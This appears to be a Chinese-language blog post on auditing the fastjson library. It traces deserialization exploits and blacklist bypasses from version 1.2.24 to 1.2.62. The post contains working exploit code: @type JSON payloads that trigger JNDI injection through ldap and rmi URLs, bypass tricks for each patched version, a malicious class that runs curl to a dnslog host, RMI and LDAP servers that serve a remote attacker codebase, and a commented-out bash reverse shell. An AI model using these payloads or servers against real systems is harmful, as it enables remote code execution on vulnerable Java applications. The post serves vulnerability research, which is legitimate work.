//com.alibaba.fastjson.serializer.JavaBeanSerializer public Map\u003cString, Object\u003e getFieldValuesMap(Object object) throws Exception { Map\u003cString, Object\u003e map = new LinkedHashMap\u003cString, Object\u003e(sortedGetters.length); for (FieldSerializer getter : sortedGetters) { map.put(getter.fieldInfo.name, getter.getPropertyValue(object));//进入get方法 } return map; } //com.alibaba.fastjson.serializer.FieldSerializer public Object getPropertyValue(Object object) throws InvocationTargetException, IllegalAccessException { Object propertyValue = fieldInfo.get(object); ... } //com.alibaba.fastjson.util.FieldInfo public Object get(Object javaObject) throws IllegalAccessException, InvocationTargetException { if (method != null) { Object value = method.invoke(javaObject, new Object[0]);//通过反射进行调用 return value; } return field.get(javaObject); } ","date":"2022-11-10","objectID":"/fastjson/:1:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"调用恶意类 public class Test { public static void main(String[] args) { /* fastjson支持使用@type来指定反序列化的目标类,@type指向一个恶意类,触发恶意代码 */ String json1 = \"{\\\"@type\\\":\\\"learn.Evil\\\",\\\"age\\\":15,\\\"name\\\":\\\"Jame\\\"}\";// dnslog JSON.parseObject(json1); System.out.println(\"---\"); /* * rmi加载恶意类,使用jdk8u102进行复现 * jdk8u113后,属性com.sun.jndi.rmi.object.trustURLCodebase和com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false * 即默认不允许RMI,cosnaming从远程的Codebase加载Reference工厂类 */ String json2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:1099/exp\\\", \\\"autoCommit\\\":true}\"; JSON.parseObject(json2); System.out.println(\"---\"); /* * ldap加载恶意类,同样使用jdk8u102进行复现 * jdk8u191后,属性com.sun.jndi.ldap.object.trustURLCodebase的默认值变为false */ String json3 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://10.10.10.3:1389/exp\\\", \\\"autoCommit\\\":true}\"; JSON.parseObject(json3); System.out.println(\"---\"); } } 本地恶意类 package learn; public class Evil { public Evil() throws IOException { System.out.println(\"Evil Construct\"); Runtime.getRuntime().exec(\"curl http://evil.c3d8e837.dns.1433.eu.org\"); } } RMI调用 package learn.RMIServer; public class EXEC { public EXEC() { try { // String command = \"bash -c $@|bash 0 echo bash -i \u003e\u0026 /dev/tcp/127.0.0.1/7000 0\u003e\u00261\"; String command = \"curl http://rmi.f15e86f1.dns.1433.eu.org\"; Process pc = Runtime.getRuntime().exec(command); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] args) { new EXEC(); } } public class Server { public static void main(String[] args) { try { LocateRegistry.createRegistry(1099); Registry registry = LocateRegistry.getRegistry(); Reference reference = new Reference(\"learn.RMIServer.EXEC\", \"learn.RMIServer.EXEC\", null); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"exp\", referenceWrapper);// rmi://127.0.0.1:1099/exp } catch (Exception e) { e.printStackTrace(); } } } LDAP调用 package learn.LDAPServer; import java.net.*; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; public class Server { private static final String LDAP_BASE = \"dc=example,dc=com\"; private static final String http_server_ip = \"10.10.10.1\"; private static final int ldap_port = 1389; private static final int http_server_port = 8000; private static class OperationInterceptor extends InMemoryOperationInterceptor { @Override public void processSearchResult(InMemoryInterceptedSearchResult result) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { // e.addAttribute(\"javaClassName\", \"learn.LDAPServer.EXEC\");// 类名 // e.addAttribute(\"javaFactory\", \"learn.LDAPServer.EXEC\");//工厂类名 e.addAttribute(\"javaCodeBase\", \"http://\" + http_server_ip + \":\" + http_server_port + \"/\");// 设置远程的恶意引用对象的地址 e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaClassName\", \"EXEC\"); e.addAttribute(\"javaFactory\", \"EXEC\"); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } catch (Exception e1) { e1.printStackTrace(); } } } public static void main(String[] args) throws Exception { try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);// 创建LDAP配置对象 config.setListenerConfigs(new InMemoryListenerConfig(\"listen\", InetAddress.getByName(\"0.0.0.0\"), ldap_port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));// 设置LDAP监听配置信息 config.addInMemoryOperationInterceptor(new Ope","date":"2022-11-10","objectID":"/fastjson/:2:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.24 ","date":"2022-11-10","objectID":"/fastjson/:3:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"黑名单处理方法 首先在DefaultJSONParser对json字符串进行解析,当解析到@type时,将对应的值提取出来后,通过TypeUtils.loadClass进行loadClass操作 //com.alibaba.fastjson.parser.DefaultJSONParser public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config){// 因为\"{}\",因此token的值为12 this.lexer = lexer; this.input = input; this.config = config; this.symbolTable = config.symbolTable; int ch = lexer.getCurrent(); if (ch == '{') { lexer.next(); ((JSONLexerBase) lexer).token = JSONToken.LBRACE; // 12 } else if (ch == '[') { lexer.next(); ((JSONLexerBase) lexer).token = JSONToken.LBRACKET; // 14 } else { lexer.nextToken(); // prime the pump } } //com.alibaba.fastjson.parser.DefaultJSONParser public Object parse(Object fieldName) { final JSONLexer lexer = this.lexer; switch (lexer.token()) { case LBRACE: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return parseObject(object, fieldName);//开始解析json字符串 } } //com.alibaba.fastjson.parser.DefaultJSONParser public final Object parseObject(final Map object, Object fieldName) { final JSONLexer lexer = this.lexer; ParseContext context = this.context; try { boolean setContextFlag = false; for (;;) { lexer.skipWhitespace(); char ch = lexer.getCurrent(); ... boolean isObjectKey = false; Object key; if (ch == '\"') { // \"@type\": \"com.sun.rowset.JdbcRowSetImpl\" key = lexer.scanSymbol(symbolTable, '\"'); // 此时key = @type lexer.skipWhitespace(); ch = lexer.getCurrent(); if (ch != ':') { throw new JSONException(\"expect ':' at \" + lexer.pos() + \", name \" + key); } } ... if (key == JSON.DEFAULT_TYPE_KEY \u0026\u0026 !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) { String typeName = lexer.scanSymbol(symbolTable, '\"'); // 提取出typeName为com.sun.rowset.JdbcRowSetImpl Class\u003c?\u003e clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader()); // 通过TypeUtils.loadClass进行loadClass操作 ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName); } } } } 在TypeUtils.lodaClass中首先判断当前类名是否在内置类名单中,不存在则进行loadClass并将类名添加到内置类名单中,返回加载类 //com.alibaba.fastjson.util.TypeUtils public static Class\u003c?\u003e loadClass(String className, ClassLoader classLoader) {//classLoader = null Class\u003c?\u003e clazz = mappings.get(className); // mappings中存放了一部分内置类,首先判断当前类名是否在内置类中 if (clazz != null) { return clazz; } if (className.charAt(0) == '[') { Class\u003c?\u003e componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } if (className.startsWith(\"L\") \u0026\u0026 className.endsWith(\";\")) {//去除开头的L和结尾的;,后续版本可用于绕过 String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } ... try { ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if (contextClassLoader != null) { clazz = contextClassLoader.loadClass(className); // 加载com.sun.rowset.JdbcRowSetImpl mappings.put(className, clazz); // 并将com.sun.rowset.JdbcRowSetImpl添加到内置类中 return clazz; } } } 在loadClass加载出的类,通过ParserConfig进行黑名单检查,判断是否能够进行反序列化处理 //com.alibaba.fastjson.parser.ParserConfig public ObjectDeserializer getDeserializer(Type type) { ... if (type instanceof Class\u003c?\u003e) { return getDeserializer((Class\u003c?\u003e) type, type); } } //com.alibaba.fastjson.parser.ParserConfig public ObjectDeserializer getDeserializer(Class\u003c?\u003e clazz, Type type) { ... String className = clazz.getName(); className = className.replace('$', '.'); for (int i = 0; i \u003c denyList.length; ++i) { String deny = denyList[i]; // 通过黑名单限制可以反序列化的类 // 1.2.24的黑名单只有java.lang.Thread if (className.startsWith(deny)) { // 黑名单判断 throw new JSONException(\"parser deny : \" + className); } } } ","date":"2022-11-10","objectID":"/fastjson/:3:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"JdbcRowSetImpl分析 package learn.bypass; import com.alibaba.fastjson.JSON; /* Fastjson 1.2.25之前版本,只是通过黑名单限制哪些类不能通过@type指定 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl com.sun.rowset.JdbcRowSetImpl 都不在黑名单中,可以直接完成攻击 */ public class bypass_1_2_24 { public static void main(String[] args) { String json_str = \"{\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\", \\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/exp\\\", \\\"autoCommit\\\":true}\"; JSON.parseObject(json_str); } } 链条分析 把断点下在com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue方法中 //com.alibaba.fastjson.parser.deserializer.FieldDeserializer public void setValue(Object object, Object value) {//object = JdbcRowSetImpl , value = ldap地址/AutoCommit的布尔值 ... try { Method method = fieldInfo.method;//method为com.sun.rowset.JdbcRowSetImpl.setDataSourceName/setAutoCommit if (method != null) { if (fieldInfo.getOnly) {//false ... } else { method.invoke(object, value);//反射调用,将DataSourceName值设置为ldap地址/设置AutoCommit } } } } 在JdbcRowSetImpl的setAutoCommit函数中,会进行connect操作,通过connect链接ldap并进行jndi注入 public void setAutoCommit(boolean autoCommit) throws SQLException { if(conn != null) { conn.setAutoCommit(autoCommit); } else { // Coming here means the connection object is null. // So generate a connection handle internally, since a JdbcRowSet is always connected to a db, it is fine to get a handle to the connection. // Get hold of a connection handle and change the autcommit as passesd. conn = connect(); conn.setAutoCommit(autoCommit); } } private Connection connect() throws SQLException { if(conn != null) { return conn; } else if (getDataSourceName() != null) { // Connect using JNDI. try { Context ctx = new InitialContext(); DataSource ds = (DataSource)ctx.lookup(getDataSourceName());//getDataSourceName()返回了ldap地址,lookup进行JNDI注入 } ... } } ","date":"2022-11-10","objectID":"/fastjson/:3:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"TemplatesImpl分析 todo ","date":"2022-11-10","objectID":"/fastjson/:3:3","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.25-41 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* 添加了配置项setAutoTypeSupport,并且使用了checkAutoType函数定义黑白名单的方式来防御反序列化漏洞 当autoTypeSupport为False时,先黑名单过滤,然后再匹配白名单,如果白名单没匹配到则报错,所以必须配置有白名单,才能进行loadClass操作 当autoTypeSupport为True时,首先进行白名单过滤,如果在白名单上则直接loadClass,否则进行黑名单过滤 com.alibaba.fastjson.parser.ParserConfig类中有一个String[]类型的denyList数组,denyList中定义了反序列化的黑名单的类包名,1.2.25-1.2.41版本中会对以下包名进行过滤 [bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework] 因此需要对checkAutoType函数中的黑名单进行绕过 */ public class bypass_1_2_25_to_41 { public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json_str = \"{\\\"@type\\\": \\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\", \\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/exp\\\", \\\"autoCommit\\\":true}\"; JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:4:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"checkAutoType分析 //com.alibaba.fastjson.parser.ParserConfig public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { final String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; if (autoTypeSupport || expectClass != null) {//开启autoTypeSupport后,对白名单和黑名单进行校验,而\"Lcom.sun.rowset.JdbcRowSetImpl;\"不在黑名单范围内,因此进入后续的TypeUtils.loadClass流程 for (int i = 0; i \u003c acceptList.length; ++i) { String accept = acceptList[i]; if (className.startsWith(accept)) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) { return clazz; } } } for (int i = 0; i \u003c denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny) \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) { throw new JSONException(\"autoType is not support. \" + typeName); } } } if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } return clazz; } TypeUtils.loadClass流程与前面1.2.24分析的流程一致 由于在TypeUtils.loadClass中会对classname开头的L和结尾的;进行去除后再进行loadclass,因此利用这一点进行绕过 if (className.startsWith(\"L\") \u0026\u0026 className.endsWith(\";\")) {//去除开头的L和结尾的;,后续版本可用于绕过 String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } ","date":"2022-11-10","objectID":"/fastjson/:4:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.42 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* 1.2.42版本将黑名单denyList替换成了denyHashCodes,fastjson使用哈希黑名单来代替之前的明文黑名单来防止被绕过,增加了绕过的困难程度 checkAutoType函数会从className中将com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类提取出来,然后把前后的字符L和;都去掉,然后再进行哈希黑名单过滤 使用双写绕过 */ public class bypass_1_2_42 { public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json_str = \"{\\\"@type\\\": \\\"LLcom.sun.rowset.JdbcRowSetImpl;;\\\", \\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/exp\\\", \\\"autoCommit\\\":true}\"; JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:5:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"checkAutoType分析 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L; if ((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) { className = className.substring(1, className.length() - 1);//将payload中双写的L和;去掉一个 } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; if (autoTypeSupport || expectClass != null) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) {//白名单 clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) { return clazz; } } if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) {//黑名单 /* 1.2.42的处理方法相当于逐字符拼接后计算哈希,然后和黑名单中的哈希进行匹配 */ throw new JSONException(\"autoType is not support. \" + typeName); } } } if (clazz == null) {//完成黑名单检测后进行loadclass,loadClass中对L和;的处理和前面的一致 clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } return clazz; } ","date":"2022-11-10","objectID":"/fastjson/:5:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.43 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* 1.2.43版本对双写L和;进行检测,但loadClass函数中的className还有对[的特殊处理,所以可以绕过 */ public class bypass_1_2_43 { public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json_str = \"{\\\"@type\\\": \\\"[com.sun.rowset.JdbcRowSetImpl\\\"[{, \\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/exp\\\", \\\"autoCommit\\\":true}\"; JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:6:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"checkAutoType分析 1.2.43版本的checkAutoType函数针对双写L和;的情况做出限制 但在前面对TypeUtils.loadClass的分析可以知道,fastjson处理对L;特殊处理外,还对[进行了特殊处理 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L; if ((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) { if ((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME == 0x9195c07b5af5345L)//针对双写L和;的情况做出限制 { throw new JSONException(\"autoType is not support. \" + typeName); } // 9195c07b5af5345 className = className.substring(1, className.length() - 1); } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; if (autoTypeSupport || expectClass != null) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) {//黑白名单校验 ... } } ... if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (clazz != null) { JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); } return clazz; } public static Class\u003c?\u003e loadClass(String className, ClassLoader classLoader, boolean cache) { ... if(className.charAt(0) == '['){ Class\u003c?\u003e componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } } 由于添加了[导致需要进行特殊处理,在\"[com.sun.rowset.JdbcRowSetImpl\"后面添加[{即可 ","date":"2022-11-10","objectID":"/fastjson/:6:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.45 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* 1.2.45版本对[的绕过进行了修复,但是黑名单不完善可以利用mybatis进行绕过 需要目标服务端存在mybatis的jar包,且需为3.x\u003c3.5.0的版本 */ public class bypass_1_2_45 { public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json_str = \"{\\\"@type\\\":\\\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\\",\\\"properties\\\":{\\\"data_source\\\":\\\"ldap://127.0.0.1:1389/exp\\\"}}\"; JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:7:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"checkAutoType分析 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L; final long h1 = (BASIC ^ className.charAt(0)) * PRIME; if (h1 == 0xaf64164c86024f1aL) { // 对[开头进行检测 throw new JSONException(\"autoType is not support. \" + typeName); } } ","date":"2022-11-10","objectID":"/fastjson/:7:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"mybatis分析 //org.apache.ibatis.datasource.jndi.JndiDataSourceFactory public void setProperties(Properties properties) { try { InitialContext initCtx; Properties env = getEnvProperties(properties); if (env == null) { initCtx = new InitialContext(); } else { initCtx = new InitialContext(env); } if (properties.containsKey(INITIAL_CONTEXT) \u0026\u0026 properties.containsKey(DATA_SOURCE)) { ... } else if (properties.containsKey(DATA_SOURCE)) {//data_source为ldap地址 dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));//lookup进行JNDI注入 } } ... } ","date":"2022-11-10","objectID":"/fastjson/:7:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.47 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* Fastjson从1.2.25开始,添加了配置项setAutoTypeSupport以及白名单,进一步限制@type的使用,默认该配置项关闭 如果配置项是关闭状态,那么只允许白名单内的类才能通过@type指定,但是存在绕过方式,且不需要setAutoTypeSupport为true 如果先传入如下JSON进行反序列化 { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" } java.lang.Class是在白名单中的,反序列化后com.sun.rowset.JdbcRowSetImpl就会被加入到白名单中,剩下的就和1.2.24相同了 */ public class bypass_1_2_47 { public static void main(String[] args) { // ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json_str = \"{\\\"a\\\": {\\\"@type\\\": \\\"java.lang.Class\\\",\\\"val\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\"},\\\"b\\\": {\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\": \\\"ldap://127.0.0.1:1389/exp\\\",\\\"autoCommit\\\": true}}\"; JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:8:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"未开启AutoTypeSupport 初始化 在com.alibaba.fastjson.parser.ParserConfig.initDeserializers中,会向deserializers中添加(Class.class, MiscCodec.instance)作为缓存,在后续的deserializer.deserialze(this, clazz, fieldName)根据clazz的内容调用相应的的deserializer 第一次checkAutoType 此时的typename为java.lang.Class public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L; final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; if (clazz == null) { clazz = deserializers.findClass(typeName); } if (clazz != null) {//clazz为class java.lang.Class ... return clazz; } } 加载deserializer 通过config.getDeserializer(clazz)获取deserializer,当前类为java.lang.Class即Class.class对应的deserializer为MiscCodec 接下来通过deserializer.deserialze(this, clazz, fieldName)进行deserialze操作 进行deserialze //com.alibaba.fastjson.serializer.MiscCodec public \u003cT\u003e T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) { if (clazz == Class.class) { return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());//此时的strVal为com.sun.rowset.JdbcRowSetImpl } } 进行loadClass try{ ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null \u0026\u0026 contextClassLoader != classLoader){ clazz = contextClassLoader.loadClass(className); if (cache) {//默认开启cache,mappings(内置类)中添加了原本处于黑名单中的com.sun.rowset.JdbcRowSetImpl mappings.put(className, clazz); } return clazz; } } 第二次checkAutoType 此时的typename为com.sun.rowset.JdbcRowSetImpl public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { ... if (clazz == null) { clazz = TypeUtils.getClassFromMapping(typeName);//从mappings(内置类)中加载com.sun.rowset.JdbcRowSetImpl } if (clazz != null) { ... return clazz;//后续流程与1.2.24一致 } } ","date":"2022-11-10","objectID":"/fastjson/:8:1","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"开启AutoTypeSupport 主要不同点在于第二次checkAutoType public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { if (autoTypeSupport || expectClass != null) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) { return clazz; } } if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) { /* * 此时com.sun.rowset.JdbcRowSetImpl匹配到黑名单中的哈希,由于当前条件运算符为\u0026\u0026,需要getClassFromMapping的结果为空才能抛出异常 * 但前面的流程中将com.sun.rowset.JdbcRowSetImpl添加到mappings(内置类)中,因此条件不满足 */ throw new JSONException(\"autoType is not support. \" + typeName); } } } if (clazz == null) { clazz = TypeUtils.getClassFromMapping(typeName);//从mappings(内置类)中加载com.sun.rowset.JdbcRowSetImpl } if (clazz != null) { ... return clazz;//后续流程与1.2.24一致 } } ","date":"2022-11-10","objectID":"/fastjson/:8:2","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"1.2.62 package learn.bypass; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; /* 与1.2.45的绕过类似,通过xbean-reflect进行绕过 */ public class bypass_1_2_62 { public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json_str = \"{\\\"@type\\\":\\\"org.apache.xbean.propertyeditor.JndiConverter\\\",\\\"AsText\\\":\\\"ldap://127.0.0.1:1389/exp\\\"}\"; JSON.parseObject(json_str); } } ","date":"2022-11-10","objectID":"/fastjson/:9:0","tags":null,"title":"fastjson分析","uri":"/fastjson/"},{"categories":["代码审计"],"content":"checkAutoType分析 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { ... final boolean expectClassFlag; if (expectClass == null) {//当且仅当expectClass参数不为空且不为Object,Serializable...等类型时expectClassFlag才为true expectClassFlag = false; } else { if (expectClass == Object.class || expectClass == Serializable.class || expectClass == Cloneable.class || expectClass == Closeable.class || expectClass == EventListener.class || expectClass == Iterable.class || expectClass == Collection.class) { expectClassFlag = false; } else { expectClassFlag = true; } } String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; final long BASIC = 0xcbf29ce484222325L; final long PRIME = 0x100000001b3L; final long h1 = (BASIC ^ className.charAt(0)) * PRIME; if (h1 == 0xaf64164c86024f1aL) { // [ throw new JSONException(\"autoType is not support. \" + typeName); } if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) { throw new JSONException(\"autoType is not support. \" + typeName); } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, TypeUtils.fnv1a_64(className)) \u003e= 0;//内部白名单检查 if ((!internalWhite) \u0026\u0026 (autoTypeSupport || expectClassFlag)) { //不在内部白名单中且开启autotype或expectClassFlag为true,进行检查 //org.apache.xbean.propertyeditor.JndiConverter不在黑名单中 long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); if (clazz != null) { return clazz; } } if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) { throw new JSONException(\"autoType is not support. \" + typeName); } } } boolean jsonType = false;//判断指定class是否存在JsonType注解信息 InputStream is = null; try { String resource = typeName.replace('.', '/') + \".class\"; if (defaultClassLoader != null) { is = defaultClassLoader.getResourceAsStream(resource); } else { is = ParserConfig.class.getClassLoader().getResourceAsStream(resource); } if (is != null) { ClassReader classReader = new ClassReader(is, true); TypeCollector visitor = new TypeCollector(\"\u003cclinit\u003e\", new Class[0]); classReader.accept(visitor); jsonType = visitor.hasJsonType(); } } ... final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features \u0026 mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026 mask) != 0;//判断是否开启autotype支持 if (clazz == null \u0026\u0026 (autoTypeSupport || jsonType || expectClassFlag)) {//满足条件,进行恶意类加载 boolean cacheClass = autoTypeSupport || jsonType; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);//加载恶意类 } if (clazz != null) { if (jsonType) { TypeUtils.addMapping(typeName, clazz); return clazz; } if (ClassLoader.class.isAssignableFrom(clazz) || javax.sql.DataSource.class.isAssignableFrom(clazz) || javax.sql.RowSet.class.isAssignableFrom(clazz)) {// 判断clazz是否为ClassLoader,DataSource,RowSet等类的子类,如果是则抛出异常 throw new JSONException(\"autoType is not support. \" + typeName); } ... JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor != null \u0026\u0026 autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } } if (clazz != null) {//添加到mappings中 TypeUtils.addMapping(typeName, clazz); } return clazz; } 